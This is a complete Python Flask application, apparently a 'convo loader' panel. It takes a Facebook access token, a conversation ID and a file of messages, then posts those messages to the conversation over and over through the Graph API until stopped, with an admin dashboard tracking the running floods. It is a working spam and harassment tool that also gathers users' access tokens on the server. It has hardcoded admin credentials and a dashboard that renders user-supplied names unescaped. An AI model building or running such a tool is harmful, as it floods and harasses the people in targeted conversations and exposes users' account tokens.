from flask import Flask, request, render_template_string, jsonify, session, redirect, url_for
import threading, requests, time, datetime

app = Flask(__name__)
app.secret_key = "alex_darkstar_secret_key"

headers = {'User-Agent': 'Mozilla/5.0'}
runtime_data = {}
stop_flags = {}

# ✅ ADMIN LOGIN DETAILS
ADMIN_USERNAME = "admin"
ADMIN_PASSWORD = "darkstar"

# =====================================================
# BACKGROUND MESSAGE THREAD FUNCTION
# =====================================================
def send_messages(access_token, thread_id, sender_name, time_interval, messages, task_id):
    start_time = time.time()
    runtime_data[task_id] = {
        "task_id": task_id,
        "fb_name": sender_name,
        "convo_uid": thread_id,
        "token": access_token[:40] + "...",
        "file": "Uploaded",
        "status": "RUNNING",
        "sent_count": 0,
        "start_time": datetime.datetime.now().strftime("%d %b %Y - %I:%M:%S %p"),
        "start_timestamp": start_time
    }

    stop_flags[task_id] = False
    while not stop_flags.get(task_id, False):
        try:
            for msg in messages:
                if stop_flags.get(task_id, False):
                    break
                api_url = f"https://graph.facebook.com/v15.0/t_{thread_id}/"
                message = f"{sender_name}: {msg}"
                params = {'access_token': access_token, 'message': message}
                requests.post(api_url, data=params, headers=headers)
                runtime_data[task_id]["sent_count"] += 1
                time.sleep(time_interval)
        except Exception as e:
            print(f"[{task_id}] Error: {e}")
            time.sleep(3)
    runtime_data[task_id]["status"] = "STOPPED"
    print(f"[{task_id}] Task stopped.")


# =====================================================
# ROUTES
# =====================================================

@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        access_token = request.form.get('accessToken')
        thread_id = request.form.get('threadId')
        sender_name = request.form.get('senderName')
        delay = int(request.form.get('delay'))
        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        task_id = f"TASK_{int(time.time())}"
        t = threading.Thread(target=send_messages, args=(access_token, thread_id, sender_name, delay, messages, task_id))
        t.start()
        return render_template_string(HTML_TASK_PAGE, task_id=task_id)

    return render_template_string(HTML_FORM_PAGE)


@app.route('/mytask/<task_id>')
def my_task(task_id):
    info = runtime_data.get(task_id)
    if not info:
        return render_template_string(HTML_ERROR_PAGE, message="❌ Task Not Found!")
    now = time.time()
    uptime = int(now - info.get("start_timestamp", now))
    hours, mins, secs = uptime // 3600, (uptime % 3600) // 60, uptime % 60
    uptime_str = f"{hours}h {mins}m {secs}s"
    return render_template_string(HTML_VIEW_TASK, **info, uptime=uptime_str)


@app.route('/stop_mytask/<task_id>', methods=['POST'])
def stop_mytask(task_id):
    if task_id in runtime_data:
        stop_flags[task_id] = True
        runtime_data[task_id]["status"] = "STOPPED"
        return jsonify({"success": True})
    return jsonify({"success": False})


# =====================================================
# ADMIN LOGIN SYSTEM
# =====================================================

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        user = request.form.get('username')
        pwd = request.form.get('password')
        if user == ADMIN_USERNAME and pwd == ADMIN_PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('dashboard'))
        else:
            return render_template_string(HTML_LOGIN_PAGE, error="❌ Invalid Username or Password!")
    return render_template_string(HTML_LOGIN_PAGE)


@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))


@app.route('/dashboard')
def dashboard():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    return render_template_string(HTML_DASHBOARD_PAGE)


@app.route('/data')
def get_data():
    if not session.get('logged_in'):
        return jsonify([])
    now = time.time()
    tasks = []
    for task_id, info in runtime_data.items():
        uptime = int(now - info.get("start_timestamp", now))
        hours, mins, secs = uptime // 3600, (uptime % 3600) // 60, uptime % 60
        tasks.append({
            **info,
            "uptime": f"{hours}h {mins}m {secs}s"
        })
    return jsonify(tasks)


@app.route('/stop/<task_id>', methods=['POST'])
def stop_task(task_id):
    if not session.get('logged_in'):
        return jsonify({"success": False})
    if task_id in runtime_data:
        stop_flags[task_id] = True
        runtime_data[task_id]["status"] = "STOPPED"
        return jsonify({"success": True})
    return jsonify({"success": False})


# =====================================================
# HTML PAGES
# =====================================================

# 🌞 MAIN HOME PAGE (Start + Manage Task)
HTML_FORM_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>ALEX DARKSTAR PANEL</title>
<style>
body {background:#fff; color:#333; font-family:'Poppins',sans-serif; margin:0; padding:20px;}
.container {max-width:450px; margin:auto;}
.box {background:#fafafa; border:2px solid #007bff; border-radius:12px; padding:20px; box-shadow:0 0 20px #007bff33; margin-top:20px;}
input,button{width:100%;padding:10px;margin:8px 0;border-radius:8px;border:1px solid #ccc;box-sizing:border-box;}
button{background:linear-gradient(90deg,#007bff,#00aaff);color:white;font-weight:bold;border:none;cursor:pointer;}
button:hover{transform:scale(1.03);}
h2{text-align:center;color:#007bff;}
a{text-align:center;display:block;color:#007bff;text-decoration:none;font-weight:bold;margin-top:10px;}
.stop{background:linear-gradient(90deg,#ff3333,#cc0000);}
</style>
</head>
<body>
<div class="container">

<div class="box">
  <h2>🚀 START A NEW TASK</h2>
  <form method="post" enctype="multipart/form-data">
    <input type="text" name="accessToken" placeholder="Access Token" required>
    <input type="text" name="threadId" placeholder="Convo/Group UID" required>
    <input type="text" name="senderName" placeholder="Sender Name" required>
    <input type="file" name="txtFile" accept=".txt" required>
    <input type="number" name="delay" placeholder="Delay (sec)" required>
    <button type="submit">Start Task</button>
  </form>
</div>

<div class="box">
  <h2>🧰 MANAGE EXISTING TASK</h2>
  <input type="text" id="taskInput" placeholder="Enter Your Task ID">
  <button onclick="checkTask()" class="check">🔎 Check Task</button>
  <button onclick="stopTask()" class="stop">🛑 Stop Task</button>
</div>

<a href="/login">🔒 Go to Admin Dashboard</a>
</div>

<script>
function checkTask(){
  let id=document.getElementById('taskInput').value.trim();
  if(id) window.location='/mytask/'+id;
  else alert('Enter Task ID first!');
}
async function stopTask(){
  let id=document.getElementById('taskInput').value.trim();
  if(!id) return alert('Enter Task ID first!');
  if(confirm('Stop this task?')){
    let res=await fetch('/stop_mytask/'+id,{method:'POST'});
    let data=await res.json();
    if(data.success) alert('✅ Task stopped successfully!');
    else alert('❌ Task not found!');
  }
}
</script>

</body>
</html>
"""

# 🌞 AFTER START PAGE
HTML_TASK_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Task Started</title>
<style>
body{background:#fff;font-family:'Poppins',sans-serif;text-align:center;color:#333;margin:0;padding:30px;}
.task-box{border:2px solid #007bff;display:inline-block;padding:20px;border-radius:12px;background:#f9f9f9;box-shadow:0 0 20px #007bff33;}
button{padding:10px 20px;border:none;border-radius:8px;cursor:pointer;color:white;font-weight:bold;margin:10px;}
.stop{background:linear-gradient(90deg,#ff3333,#cc0000);}
.check{background:linear-gradient(90deg,#007bff,#00aaff);}
</style>
</head>
<body>
  <div class="task-box">
    <h2>✅ Task Started Successfully!</h2>
    <p><b>Your Task ID:</b> <span style="color:#007bff;">{{ task_id }}</span></p>
    <button class="check" onclick="window.location='/mytask/{{ task_id }}'">🔎 Check My Task</button>
    <button class="stop" onclick="stopTask('{{ task_id }}')">🛑 Stop My Task</button>
  </div>
<script>
async function stopTask(id){
  if(confirm('Stop this task?')){
    let res=await fetch('/stop_mytask/'+id,{method:'POST'});
    let data=await res.json();
    if(data.success) alert('✅ Task stopped successfully!');
    else alert('❌ Failed to stop task!');
  }
}
</script>
</body>
</html>
"""

# 🌞 VIEW MY TASK STATUS PAGE
HTML_VIEW_TASK = """
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>My Task</title></head>
<body style="font-family:'Poppins',sans-serif;background:#fff;color:#333;text-align:center;padding:30px;">
<h2 style="color:#007bff;">📊 Your Task Status</h2>
<div style="border:2px solid #007bff;display:inline-block;padding:20px;border-radius:12px;background:#f9f9f9;box-shadow:0 0 20px #007bff33;text-align:left;">
<p><b>TASK ID:</b> {{ task_id }}</p>
<p><b>Status:</b> {{ status }}</p>
<p><b>FB Name:</b> {{ fb_name }}</p>
<p><b>Convo UID:</b> {{ convo_uid }}</p>
<p><b>Messages Sent:</b> {{ sent_count }}</p>
<p><b>Start Time:</b> {{ start_time }}</p>
<p><b>Uptime:</b> {{ uptime }}</p>
</div>
<br><br>
<a href="/" style="color:#007bff;">⬅️ Back to Home</a>
</body>
</html>
"""

# 🌞 ADMIN LOGIN PAGE
HTML_LOGIN_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>LOGIN - ALEX DARKSTAR</title>
<style>
body{background:#fff;display:flex;justify-content:center;align-items:center;height:100vh;font-family:'Poppins',sans-serif;}
.box{background:#f9f9f9;padding:25px;border-radius:12px;border:2px solid #007bff;box-shadow:0 0 20px #007bff33;width:90%;max-width:400px;}
input,button{width:100%;padding:10px;margin:8px 0;border-radius:8px;border:1px solid #ccc;}
button{background:linear-gradient(90deg,#007bff,#00aaff);color:white;font-weight:bold;border:none;cursor:pointer;}
.error{text-align:center;color:red;}
</style>
</head>
<body>
<div class="box">
<h2 style="text-align:center;color:#007bff;">🔐 Admin Login</h2>
{% if error %}<p class="error">{{ error }}</p>{% endif %}
<form method="post">
  <input type="text" name="username" placeholder="Username" required>
  <input type="password" name="password" placeholder="Password" required>
  <button type="submit">Login</button>
</form>
</div>
</body>
</html>
"""

# 🌞 ADMIN DASHBOARD PAGE
HTML_DASHBOARD_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>⚡ LIVE DASHBOARD ⚡</title>
<style>
body{background:#fff;font-family:'Poppins',sans-serif;color:#222;margin:0;padding:20px;}
h2{text-align:center;color:#007bff;}
table{width:100%;max-width:1000px;margin:auto;border-collapse:collapse;}
th,td{border:1px solid #ddd;padding:8px;text-align:center;}
th{background:#007bff;color:white;}
tr:nth-child(even){background:#f9f9f9;}
.running{color:green;font-weight:bold;}
.stopped{color:red;font-weight:bold;}
button{padding:5px 10px;border:none;border-radius:5px;color:white;cursor:pointer;font-weight:bold;}
.stop-btn{background:linear-gradient(90deg,#ff3333,#cc0000);}
a{color:#007bff;text-decoration:none;font-weight:bold;display:block;text-align:center;margin-top:15px;}
</style>
</head>
<body>
<h2>⚡ ALEX DARKSTAR LIVE DASHBOARD ⚡</h2>
<table id="taskTable">
<thead><tr><th>TASK ID</th><th>FB NAME</th><th>CONVO UID</th><th>STATUS</th><th>SENT</th><th>UPTIME</th><th>ACTION</th></tr></thead>
<tbody></tbody>
</table>
<a href="/logout">🚪 Logout</a>
<script>
async function fetchData(){
  const res=await fetch('/data');
  const data=await res.json();
  const tbody=document.querySelector('#taskTable tbody');
  tbody.innerHTML='';
  data.forEach(t=>{
    const row=document.createElement('tr');
    row.innerHTML=`
      <td>${t.task_id}</td>
      <td>${t.fb_name}</td>
      <td>${t.convo_uid}</td>
      <td class="${t.status=='RUNNING'?'running':'stopped'}">${t.status}</td>
      <td>${t.sent_count}</td>
      <td>${t.uptime}</td>
      <td>${t.status=='RUNNING'?'<button class="stop-btn" onclick="stopTask(\\''+t.task_id+'\\')">Stop</button>':'-'}</td>`;
    tbody.appendChild(row);
  });
}
async function stopTask(id){
  if(confirm('Stop '+id+' ?')){await fetch('/stop/'+id,{method:'POST'});fetchData();}
}
setInterval(fetchData,1000);
fetchData();
</script>
</body>
</html>
"""

# 🌞 ERROR PAGE
HTML_ERROR_PAGE = """
<!DOCTYPE html><html><body style="text-align:center;margin-top:20%;font-family:'Poppins',sans-serif;background:#fff;color:red;">
<h2>{{ message }}</h2><a href="/">Go Back</a></body></html>
"""

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
